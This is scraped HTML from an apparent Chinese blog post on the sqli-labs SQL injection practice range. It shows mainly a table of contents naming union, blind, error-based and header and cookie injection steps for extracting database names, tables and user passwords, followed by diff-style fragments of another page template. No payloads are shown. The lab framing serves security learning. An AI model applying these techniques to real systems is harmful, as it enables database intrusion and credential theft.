fa-fw"></i> 2022-04-12</div><div class="title">sqli靶场(54~65关)</div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">echozt</div><div class="author-info-description">分享知识，记录生活</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">49</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">82</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">14</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/echozt"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#union%E6%93%8D%E4%BD%9C%E7%AC%A6%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">union操作符：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Limit%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">Limit：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#union%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%EF%BC%88Less-1-Less-4-GET%EF%BC%89"><span class="toc-number">2.</span> <span class="toc-text">union联合注入（Less-1~Less-4 GET）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Get%E6%B3%A8%E5%85%A5"><span class="toc-number">2.0.1.</span> <span class="toc-text">Get注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-1"><span class="toc-number">2.1.</span> <span class="toc-text">Less-1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E7%94%A8order-by%E5%88%A4%E6%96%AD%E6%9C%89%E5%87%A0%E4%B8%AA%E5%AD%97%E6%AE%B5"><span class="toc-number">2.1.0.1.</span> <span class="toc-text">（1）用order by判断有几个字段</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E5%88%A4%E6%96%AD%E5%9B%9E%E6%98%BE%E7%82%B9"><span class="toc-number">2.1.0.2.</span> <span class="toc-text">（2）判断回显点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%883%EF%BC%89%E5%9B%A0%E6%AD%A4%EF%BC%8C%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E5%9C%A82-3%E5%9B%9E%E6%98%BE%E7%9A%84%E4%BD%8D%E7%BD%AE%E6%9E%84%E9%80%A0sql%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5%E6%9F%A5%E8%AF%A2%E6%88%91%E4%BB%AC%E6%83%B3%E8%A6%81%E7%9A%84%E4%B8%9C%E8%A5%BF"><span class="toc-number">2.1.0.3.</span> <span class="toc-text">（3）因此，我们可以在2,3回显的位置构造sql查询语句查询我们想要的东西</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">2.1.1.</span> <span class="toc-text">1.1获取数据库</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E8%8E%B7%E5%8F%96%E5%8D%95%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="toc-number">2.1.1.1.</span> <span class="toc-text">①获取单个数据库名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E8%8E%B7%E5%BE%97%E6%89%80%E6%9C%89%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="toc-number">2.1.1.2.</span> <span class="toc-text">②获得所有数据库名</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2%E8%8E%B7%E5%8F%96%E8%A1%A8%E6%A0%BC"><span class="toc-number">2.1.2.</span> <span class="toc-text">1.2获取表格</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E5%BE%97%E5%88%B0%E5%8D%95%E4%B8%AA%E8%A1%A8%E6%A0%BC"><span class="toc-number">2.1.2.1.</span> <span class="toc-text">①得到单个表格</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E5%BE%97%E5%88%B0%E6%89%80%E6%9C%89%E8%A1%A8%E6%A0%BC"><span class="toc-number">2.1.2.2.</span> <span class="toc-text">②得到所有表格</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5%E5%90%8D"><span class="toc-number">2.1.3.</span> <span class="toc-text">1.3获取字段名</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E8%8E%B7%E5%BE%97%E5%8D%95%E4%B8%AA%E5%AD%97%E6%AE%B5%E5%90%8D"><span class="toc-number">2.1.3.1.</span> <span class="toc-text">①获得单个字段名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E8%8E%B7%E5%BE%97%E6%89%80%E6%9C%89%E5%AD%97%E6%AE%B5%E5%90%8D"><span class="toc-number">2.1.3.2.</span> <span class="toc-text">②获得所有字段名</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-4%E8%8E%B7%E5%8F%96%E8%A1%A8%E6%A0%BC%E9%87%8C%E9%9D%A2%E7%9A%84%E5%86%85%E5%AE%B9"><span class="toc-number">2.1.4.</span> <span class="toc-text">1.4获取表格里面的内容</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E8%8E%B7%E5%BE%97%E5%8D%95%E4%B8%AA%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81"><span class="toc-number">2.1.4.1.</span> <span class="toc-text">①获得单个用户名和密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E8%8E%B7%E5%BE%97%E6%89%80%E6%9C%89%E7%9A%84%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81"><span class="toc-number">2.1.4.2.</span> <span class="toc-text">②获得所有的用户名和密码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-2"><span class="toc-number">2.2.</span> <span class="toc-text">Less-2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-3"><span class="toc-number">2.3.</span> <span class="toc-text">Less-3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-4"><span class="toc-number">2.4.</span> <span class="toc-text">Less-4</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8-Less-5-Less-10-GET"><span class="toc-number">3.</span> <span class="toc-text">盲注(Less-5~Less-10 GET)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-5-%E5%9F%BA%E4%BA%8E%E5%B8%83%E5%B0%94%E5%9E%8B%E7%9A%84%E7%9B%B2%E6%B3%A8"><span class="toc-number">3.1.</span> <span class="toc-text">Less-5 基于布尔型的盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-number">3.1.1.</span> <span class="toc-text">（1）可以使用延时注入：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-number">3.1.2.</span> <span class="toc-text">（2）可以使用报错注入：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E5%BE%97%E5%88%B0%E5%BA%93"><span class="toc-number">3.1.2.1.</span> <span class="toc-text">①得到库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E5%90%8D"><span class="toc-number">3.1.2.2.</span> <span class="toc-text">②获取用户名</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%883%EF%BC%89%E4%B8%8B%E9%9D%A2%E9%87%87%E7%94%A8%E7%9A%84%E6%98%AF%E5%9F%BA%E4%BA%8E%E5%B8%83%E5%B0%94%E5%9E%8B%E7%9A%84%E7%9B%B2%E6%B3%A8%EF%BC%9A"><span class="toc-number">3.1.3.</span> <span class="toc-text">（3）下面采用的是基于布尔型的盲注：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1%E8%8E%B7%E5%8F%96%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF"><span class="toc-number">3.1.4.</span> <span class="toc-text">5.1获取敏感信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-2%E8%8E%B7%E5%8F%96%E8%A1%A8%E5%90%8D"><span class="toc-number">3.1.5.</span> <span class="toc-text">5.2获取表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-3%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5%E5%90%8D"><span class="toc-number">3.1.6.</span> <span class="toc-text">5.3获取字段名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-4%E8%8E%B7%E5%8F%96%E8%A1%A8%E9%87%8C%E9%9D%A2%E7%9A%84%E5%86%85%E5%AE%B9"><span class="toc-number">3.1.7.</span> <span class="toc-text">5.4获取表里面的内容</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-6"><span class="toc-number">3.2.</span> <span class="toc-text">Less-6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-7%E6%96%87%E4%BB%B6%E5%AF%BC%E5%85%A5%E6%B3%A8%E5%85%A5"><span class="toc-number">3.3.</span> <span class="toc-text">Less-7文件导入注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-8"><span class="toc-number">3.4.</span> <span class="toc-text">Less-8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-9-%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84sql%E7%9B%B2%E6%B3%A8%EF%BC%88%E9%87%87%E7%94%A8sqlmap%EF%BC%89"><span class="toc-number">3.5.</span> <span class="toc-text">Less-9 基于时间的sql盲注（采用sqlmap）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A"><span class="toc-number">3.5.1.</span> <span class="toc-text">（1）方法一：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E8%8E%B7%E5%BE%97%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="toc-number">3.5.1.1.</span> <span class="toc-text">①获得数据库名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E8%8E%B7%E5%BE%97%E8%A1%A8%E5%90%8D"><span class="toc-number">3.5.1.2.</span> <span class="toc-text">②获得表名</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A"><span class="toc-number">3.5.2.</span> <span class="toc-text">（2）方法二：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-1%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5"><span class="toc-number">3.5.3.</span> <span class="toc-text">9.1判断注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-2%E8%8E%B7%E5%8F%96%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF"><span class="toc-number">3.5.4.</span> <span class="toc-text">9.2获取敏感信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-3%E8%8E%B7%E5%8F%96%E8%A1%A8"><span class="toc-number">3.5.5.</span> <span class="toc-text">9.3获取表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-4%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5"><span class="toc-number">3.5.6.</span> <span class="toc-text">9.4获取字段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-5%E6%9F%A5%E8%AF%A2%E8%B4%A6%E5%8F%B7%E5%92%8C%E5%AF%86%E7%A0%81"><span class="toc-number">3.5.7.</span> <span class="toc-text">9.5查询账号和密码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-10"><span class="toc-number">3.6.</span> <span class="toc-text">Less-10</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#union%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%EF%BC%88Less-11-Less-12-POST%EF%BC%89"><span class="toc-number">4.</span> <span class="toc-text">union联合注入（Less-11~Less-12 POST）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#post%E6%B3%A8%E5%85%A5"><span class="toc-number">4.0.1.</span> <span class="toc-text">post注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-11"><span class="toc-number">4.1.</span> <span class="toc-text">Less-11</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#11-1%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E5%90%8D"><span class="toc-number">4.1.1.</span> <span class="toc-text">11.1获取用户名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11-2%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="toc-number">4.1.2.</span> <span class="toc-text">11.2获取数据库名</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-12"><span class="toc-number">4.2.</span> <span class="toc-text">Less-12</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8%EF%BC%88Less-13-Less-17-POST%EF%BC%89"><span class="toc-number">5.</span> <span class="toc-text">盲注（Less-13~Less-17 POST）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-13-%E5%9F%BA%E4%BA%8E%E5%B8%83%E5%B0%94%E5%9E%8B%E7%9A%84%E7%9B%B2%E6%B3%A8"><span class="toc-number">5.1.</span> <span class="toc-text">Less-13 基于布尔型的盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E5%8F%AF%E4%BB%A5%E9%87%87%E7%94%A8%E5%9F%BA%E4%BA%8E%E5%B8%83%E5%B0%94%E5%9E%8B%E7%9A%84%E7%9B%B2%E6%B3%A8"><span class="toc-number">5.1.1.</span> <span class="toc-text">（1）可以采用基于布尔型的盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%8C%9C%E6%B5%8B%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%94%A8%E6%88%B7%E5%90%8D%EF%BC%9A"><span class="toc-number">5.1.1.1.</span> <span class="toc-text">猜测当前数据库用户名：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E5%8F%AF%E4%BB%A5%E9%87%87%E7%94%A8%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">5.1.2.</span> <span class="toc-text">（2）可以采用报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%EF%BC%9A"><span class="toc-number">5.1.2.1.</span> <span class="toc-text">①获取数据库名：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%94%A8%E6%88%B7%E5%90%8D%EF%BC%9A"><span class="toc-number">5.1.2.2.</span> <span class="toc-text">②获取当前数据库用户名：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-14"><span class="toc-number">5.2.</span> <span class="toc-text">Less-14</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E9%87%87%E7%94%A8%E5%9F%BA%E4%BA%8E%E5%B8%83%E5%B0%94%E5%9E%8B%E7%9A%84%E7%9B%B2%E6%B3%A8%E3%80%82"><span class="toc-number">5.2.1.</span> <span class="toc-text">（1）采用基于布尔型的盲注。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E9%87%87%E7%94%A8%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E3%80%82"><span class="toc-number">5.2.2.</span> <span class="toc-text">（2）采用报错注入。</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-15"><span class="toc-number">5.3.</span> <span class="toc-text">Less-15</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E5%9F%BA%E4%BA%8E%E5%B8%83%E5%B0%94%E5%9E%8B%E7%9A%84%E7%9B%B2%E6%B3%A8"><span class="toc-number">5.3.1.</span> <span class="toc-text">（1）基于布尔型的盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E7%8C%9C%E6%B5%8B%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%94%A8%E6%88%B7%E5%90%8D%EF%BC%9A"><span class="toc-number">5.3.1.1.</span> <span class="toc-text">①猜测当前数据库用户名：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E7%8C%9C%E6%B5%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="toc-number">5.3.1.2.</span> <span class="toc-text">②猜测数据库名</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5"><span class="toc-number">5.3.2.</span> <span class="toc-text">（2）延时注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E7%8C%9C%E6%B5%8B%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%94%A8%E6%88%B7%E5%90%8D%EF%BC%9A-1"><span class="toc-number">5.3.2.1.</span> <span class="toc-text">①猜测当前数据库用户名：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E7%8C%9C%E6%B5%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D-1"><span class="toc-number">5.3.2.2.</span> <span class="toc-text">②猜测数据库名</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-16"><span class="toc-number">5.4.</span> <span class="toc-text">Less-16</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-17"><span class="toc-number">5.5.</span> <span class="toc-text">Less-17</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-number">5.5.1.</span> <span class="toc-text">使用报错注入：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E7%8C%9C%E6%B5%8B%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%94%A8%E6%88%B7%E5%90%8D"><span class="toc-number">5.5.1.1.</span> <span class="toc-text">①猜测当前数据库用户名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E7%8C%9C%E6%B5%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D-2"><span class="toc-number">5.5.1.2.</span> <span class="toc-text">②猜测数据库名</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HTTP%E5%A4%B4%E9%83%A8%E6%8F%92%E5%85%A5-Less-18-Less22"><span class="toc-number">6.</span> <span class="toc-text">HTTP头部插入(Less-18~Less22)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-18-%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84%E7%94%A8%E6%88%B7%E4%BB%A3%E7%90%86%EF%BC%8C%E5%A4%B4%E9%83%A8POST%E6%B3%A8%E5%85%A5"><span class="toc-number">6.1.</span> <span class="toc-text">Less-18 基于错误的用户代理，头部POST注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-number">6.1.1.</span> <span class="toc-text">利用报错注入：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E8%8E%B7%E5%BE%97%E6%95%B0%E6%8D%AE%E5%BA%93%E7%94%A8%E6%88%B7%E5%90%8D"><span class="toc-number">6.1.1.1.</span> <span class="toc-text">①获得数据库用户名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E8%8E%B7%E5%BE%97%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="toc-number">6.1.1.2.</span> <span class="toc-text">②获得数据库名</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-19-%E5%9F%BA%E4%BA%8E%E5%A4%B4%E9%83%A8%E7%9A%84Referer-POST%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">6.2.</span> <span class="toc-text">Less-19 基于头部的Referer POST报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E8%8E%B7%E5%BE%97%E6%95%B0%E6%8D%AE%E5%BA%93%E7%94%A8%E6%88%B7%E5%90%8D-1"><span class="toc-number">6.2.0.1.</span> <span class="toc-text">①获得数据库用户名</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-20-%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84cookie%E5%A4%B4%E9%83%A8POST%E6%B3%A8%E5%85%A5"><span class="toc-number">6.3.</span> <span class="toc-text">Less-20 基于错误的cookie头部POST注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A0%E8%8E%B7%E5%BE%97%E6%95%B0%E6%8D%AE%E5%BA%93%E7%94%A8%E6%88%B7%E5%90%8D-2"><span class="toc-number">6.3.1.</span> <span class="toc-text">①获得数据库用户名</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E8%8E%B7%E5%BE%97%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D-1"><span class="toc-number">6.3.1.1.</span> <span class="toc-text">②获得数据库名</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-21-%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84%E5%A4%8D%E6%9D%82%E7%9A%84%E5%AD%97%E7%AC%A6%E5%9E%8BCookie%E6%B3%A8%E5%85%A5"><span class="toc-number">6.4.</span> <span class="toc-text">Less-21  基于错误的复杂的字符型Cookie注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E8%8E%B7%E5%BE%97%E6%95%B0%E6%8D%AE%E5%BA%93%E7%94%A8%E6%88%B7%E5%90%8D-3"><span class="toc-number">6.4.0.1.</span> <span class="toc-text">①获得数据库用户名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E8%8E%B7%E5%BE%97%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D-2"><span class="toc-number">6.4.0.2.</span> <span class="toc-text">②获得数据库名</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-22-%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84%E5%8F%8C%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8BCookie%E6%B3%A8%E5%85%A5"><span class="toc-number">6.5.</span> <span class="toc-text">Less-22 基于错误的双引号字符型Cookie注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E8%8E%B7%E5%BE%97%E6%95%B0%E6%8D%AE%E5%BA%93%E7%94%A8%E6%88%B7%E5%90%8D-4"><span class="toc-number">6.5.0.1.</span> <span class="toc-text">①获得数据库用户名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E8%8E%B7%E5%BE%97%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D-3"><span class="toc-number">6.5.0.2.</span> <span class="toc-text">②获得数据库名</span></a></li></ol></li></ol></li></ol></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url(/img/footer.png);"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2024 By echozt</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="false"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="富强,民主,文明,和谐,自由,平等,公正,法治,爱国,敬业,诚信,友善" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
+<img src="/posts/bb32/22_3.png" srcset="/img/loading.gif" lazyload class>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+                    
+                      <a class="hover-with-bg" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%B8%93%E9%A1%B9%E9%9D%B6%E5%9C%BA/">专项靶场</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E9%9D%B6%E5%9C%BA/">靶场</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Web%E6%BC%8F%E6%B4%9E/">Web漏洞</a>
+                    
+                      <a class="hover-with-bg" href="/tags/sql%E6%B3%A8%E5%85%A5/">sql注入</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/posts/fb8a.html">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">sqli靶场(23~37关)</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/posts/1702.html">
+                        <span class="hidden-mobile">upload文件上传靶场</span>
+                        <span class="visible-mobile">下一篇</span>
